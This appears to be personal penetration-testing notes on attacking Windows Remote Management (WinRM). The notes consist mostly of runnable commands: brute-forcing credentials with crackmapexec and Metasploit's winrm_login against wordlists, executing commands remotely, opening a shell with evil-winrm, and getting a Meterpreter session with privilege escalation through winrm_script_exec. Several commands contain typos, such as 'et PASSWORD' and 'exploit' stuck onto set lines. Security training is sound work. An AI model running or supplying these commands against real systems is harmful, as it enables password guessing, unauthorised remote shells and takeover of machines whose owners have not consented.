Not enabled by default
![](</Images/Pasted image 20231203173838.png>)

nmap default scan won't find. Either open range or ports 5985 or 5986 

PORT     STATE SERVICE
5985/tcp open  wsman

#crackmapexec can brute force to get credentials or execute 
Examples:
>brute force
```bash
crackmapexec winrm $IP -u $USER -p $WORDLIST
```


>execute commands
>`crackmapexec winrm -u <user> -p <passowrd> -x <command>`


## evil-winrm 
Can be used to obtain a command shell
```bash
evil-winrm.rb -u $USER -p $PASSWORD -i $IP
```


#metasploit can be used for meterpreter session
`module winrm_script_exec`

Also has method check, returns two methods that show it can be brute forced with msfconsole

winrm cmd will allow executing commands.

Script to exploit winRM, meterpreter, and migrate/elevate privs. Needs credentials
`/windows/winrm/winrm_script_exec`

Brute force with metasploit:
```bash
msfconsole -q use auxiliary/scanner/winrm/winrm_login 
set RHOSTS $IP
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt 
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

Execute commands:
```bash
use auxiliary/scanner/winrm/winrm_cmd 
set RHOSTS $IP 
set USERNAME administrator 
set PASSWORD tinkerbell 
set CMD whoami exploit
```

Meterpreter session:
```bash
use exploit/windows/winrm/winrm_script_exec 
set RHOSTS $IP
set USERNAME administrator 
et PASSWORD tinkerbell 
set FORCE_VBS true exploit
```
